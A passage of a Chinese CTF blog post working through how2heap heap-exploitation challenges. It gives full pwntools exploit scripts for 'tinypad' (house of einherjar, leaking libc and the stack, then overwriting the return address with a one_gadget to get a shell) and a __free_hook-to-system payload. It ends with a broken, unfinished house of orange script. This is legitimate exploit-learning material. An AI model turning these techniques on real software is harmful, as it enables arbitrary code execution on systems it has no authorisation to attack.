class="comment">#pause()</span></span><br><span class="line"><span class="comment"># 0x7ce1c09c1b58 0x7ce1c0600000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#00000000003c3788  w   DO .bss   0000000000000008  GLIBC_2.2.5 __free_hook</span></span><br><span class="line"><span class="comment">#00000000000456a0  w   DF .text  000000000000002d  GLIBC_2.2.5 system</span></span><br><span class="line">__free_hook = libc_addr + <span class="number">0x03c3788</span></span><br><span class="line">system = libc_addr + <span class="number">0x000456a0</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x13377331</span>)+ p64(storage)+p64(<span class="number">0x1000</span>)+p64(__free_hook)+p64(<span class="number">0x100</span>)+p64(storage+<span class="number">0x50</span>)+p64(<span class="number">0x100</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">Update(<span class="number">0</span>,payload)</span><br><span class="line">Update(<span class="number">1</span>,p64(system))</span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()%                                                                                            ```</span><br></pre></td></tr></table></figure>

<p>注意unsortedbin会先被并入largebin 然后切割.</p>
<h2 id="tinypad"><a href="#tinypad" class="headerlink" title="tinypad"></a>tinypad</h2><p>这一题基本就是我自己写的了<br>从这题流程来看 house_of_einherjar利用条件是:<br>能够泄露heap地址和控制目标指针的地址<br>目标指针附近能够伪造fakechunk<br>有off-one-bye</p>
<p>先看几个功能<br>ADD: 任意大小申请 申请的同时写入目标大小 add的过程有off_one_byte漏洞<br>Delete: free，会把size清零，但是这题仍然有uaf，因为无论什么时候程序都会尝试输出指针指向内容<br>Edit:重新编辑 长度不会超过strlen(ptr)<br>Quit:退出</p>
<p>首先我们需要泄露libc和heap地址，这很容易实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">Add(<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">Add(<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">Add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这时候3的fd会是main_arena<br>1的fd会是3的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p.recvuntil(b&#x27;CONTENT: &#x27;)</span><br><span class="line">chunk3_addr=u64(p.recvline().rstrip(b&#x27;\n&#x27;).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(chunk3_addr))</span><br><span class="line">p.recvuntil(b&#x27;CONTENT: &#x27;)</span><br><span class="line">p.recvuntil(b&#x27;CONTENT: &#x27;)</span><br><span class="line">libc_addr = u64(p.recvline().rstrip(b&#x27;\n&#x27;).ljust(8,b&#x27;\x00&#x27;))-(0x784f0c5bf7b8-0x784f0c200000)</span><br><span class="line">print(hex(libc_addr))</span><br></pre></td></tr></table></figure>

<p>我们等会会off-one-byte到3来打house of einherjar<br>先做好提前准备<br>我们需要控制的位置内存布局如下<br>0x0 buffer: 256<br>0x100 ptr1_size: 8<br>0x108 ptr1_ptr: 8<br>0x110 ptr2_size: 8<br>……<br>0x130 ptr4_size: 8<br>0x138 ptr4_ptr: 8</p>
<p>前面我们先delete了3，先进后出规则 重新申请回来1的时候 ptr1_size会填入0x100 这使得我们能通过unlink对于下一个chunk,prev_size的检查<br>于是我们需要把fakechunk放在buffer+0x20的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tinypad = <span class="number">0x602040</span></span><br><span class="line"><span class="comment">#fakechunk设置0x20偏移，可以利用到size 同时可以覆盖前两个指针</span></span><br><span class="line">fakechunk = <span class="number">0x602060</span></span><br></pre></td></tr></table></figure>

<p>先计算好prev_size</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">prev_size = chunk3_addr - fakechunk</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(prev_size))</span><br></pre></td></tr></table></figure>

<p>把chunk先malloc回来方便后面利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*0x20+p64(0)+p64(0x101)+p64(fakechunk)*2</span><br><span class="line">Add(0xf8,b&#x27;a&#x27;)  #1 但是在3的位置</span><br><span class="line">Add(0x100,b&#x27;a&#x27;*100) #3 ,但是在1的位置</span><br></pre></td></tr></table></figure>

<p>off_one_byte</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xf8</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xf0</span>+p64(prev_size)) <span class="comment">#不能直接edit 因为edit是从buf复制过去的</span></span><br></pre></td></tr></table></figure>

<p>伪造fakechunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(fakechunk)*<span class="number">2</span></span><br><span class="line">Edit(<span class="number">3</span>,payload)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>这里注意 因为fakechunk这时候进入了unsortedbin  我们还需要重新伪造一遍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Edit(4,payload) </span><br></pre></td></tr></table></figure>

<p>然后 我们需要控制 main的返回地址 这里不能控制malloc_hook或者 free_hook 因为他们原本都是0 这导致我们无法对其修改</p>
<p>获得main的栈帧地址 可以通过libc里面的__environ 它会指向main函数的environ参数<br>0x74359e5c24a0-0x74359e200000+libc 有stack 0x7ffd1f2631b8-0x7ffd1f245000<br>这里我用的libc版本稍微不同 具体需要按照自己的libc来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Add(<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>-<span class="number">0x20</span>-<span class="number">16</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x74359e5c24a0</span>-<span class="number">0x74359e200000</span>+libc_addr)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x602148</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">environ=u64(p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#environ相对于 ret_addr 多0x7fff646ca878-0x7fff646ca788</span></span><br><span class="line">ret_addr = environ -(<span class="number">0x7fff646ca878</span>-<span class="number">0x7fff646ca788</span>)</span><br><span class="line">one_gadget =<span class="number">0xe7566</span>+libc_addr</span><br><span class="line">Edit(<span class="number">2</span>,p64(ret_addr))</span><br><span class="line">Edit(<span class="number">1</span>,p64(one_gadget))</span><br></pre></td></tr></table></figure>

<p>然后退出即可获得shell</p>
<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./tinypad&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size,data</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(SIZE)&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(CONTENT)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;D&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(INDEX)&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Edit</span>(<span class="params">index,data</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(INDEX)&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(CONTENT)&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"><span class="comment">#第一个不能是0x100大小，不然最低位是0x00导致无法泄露</span></span><br><span class="line">Add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">Add(<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">Add(<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">Add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">Delete(<span class="number">3</span>)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">chunk3_addr=u64(p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk3_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">libc_addr = u64(p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-(<span class="number">0x784f0c5bf7b8</span>-<span class="number">0x784f0c200000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">tinypad = <span class="number">0x602040</span></span><br><span class="line"><span class="comment">#fakechunk设置0x20偏移，可以利用到size 同时可以覆盖前两个指针</span></span><br><span class="line">fakechunk = <span class="number">0x602060</span></span><br><span class="line">prev_size = chunk3_addr - fakechunk</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(prev_size))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(fakechunk)*<span class="number">2</span></span><br><span class="line">Add(<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>)  <span class="comment">#1 但是在3的位置</span></span><br><span class="line">Add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">100</span>) <span class="comment">#3 ,但是在1的位置</span></span><br><span class="line">Delete(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xf8</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xf0</span>+p64(prev_size)) <span class="comment">#不能直接edit 因为edit是从buf复制过去的</span></span><br><span class="line">Edit(<span class="number">3</span>,payload)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line">Edit(<span class="number">4</span>,payload) <span class="comment">#delete之后会被重新填入数据 因此我们需要再一次修改 才能通过检测</span></span><br><span class="line"><span class="comment">#one_gadget 0xe6665+libc_addr</span></span><br><span class="line"><span class="comment">#0x74359e5c24a0-0x74359e200000+libc 有stack 0x7ffd1f2631b8-0x7ffd1f245000</span></span><br><span class="line">Add(<span class="number">0xf8</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>-<span class="number">0x20</span>-<span class="number">16</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x74359e5c24a0</span>-<span class="number">0x74359e200000</span>+libc_addr)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x602148</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;CONTENT: &#x27;</span>)</span><br><span class="line">environ=u64(p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#environ相对于 ret_addr 多0x7fff646ca878-0x7fff646ca788</span></span><br><span class="line">ret_addr = environ -(<span class="number">0x7fff646ca878</span>-<span class="number">0x7fff646ca788</span>)</span><br><span class="line">one_gadget =<span class="number">0xe7566</span>+libc_addr</span><br><span class="line">Edit(<span class="number">2</span>,p64(ret_addr))</span><br><span class="line">Edit(<span class="number">1</span>,p64(one_gadget))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()  <span class="comment">#退出即可获取shell</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>先看每个功能</p>
<p>Build:<br>新建一个house<br>按顺序输入 name长度，name ，price,color<br>使用一个结构体存储两个部分的指针<br>结构体:<br>0x0: ptr to description(price and color)<br>0x8: ptr to name</p>
<p>name 就是一个存储name的chunk 申请大小最大不超过4096<br>description 是calloc(1uLL, 8uLL)<br>前四个字节存储价格 后四个字节存储颜色</p>
<p>Upgrade:<br>更新当前的house<br>漏洞就在这里 更新的时候是重新指定大小的 所以可以有非常大的溢出</p>
<p>See:<br>输出 这里也有漏洞，因为申请没有初始化 所以可以泄露地址。</p>
<p>这题就是标准的house_of_orange 所以就不写思路了<br>直接写流程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./house_of_orange&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Length of name:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Name:&#x27;</span>,data)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Price of Orange&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Color of Orange&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Update</span>(<span class="params">size,date</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Length of name:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Name:&#x27;</span>,data)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Price of Orange&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Color of Orange&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Your choice&#x27;</span> ,<span class="built_in">str</span>(<span class="number">2</span>))</span><br></pre></td></tr></table></figure>



<h1 id=""><a href="#" class="headerlink" title=""></a></h1></div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">v我50.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/QRpay/WechatPay.jpg"><img loading="lazy" src="/QRpay/WechatPay.jpg" alt="微信" title="微信"></a><div><span style="color:#2DC100"><span class="icon iconify" data-icon="ri:wechat-pay-line"></span></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>py</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://juryorca.github.io/2025/07/10/how2heap%E4%BE%8B%E9%A2%98/" title="how2heap例题">http://juryorca.github.io/2025/07/10/how2heap%E4%BE%8B%E9%A2%98/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/08/07/IO-File/" rel="prev" title="IO_File"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">IO_File</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/05/27/how2heap/" rel="next" title="how2heap"><span class="post-nav-text">how2heap</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> py</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>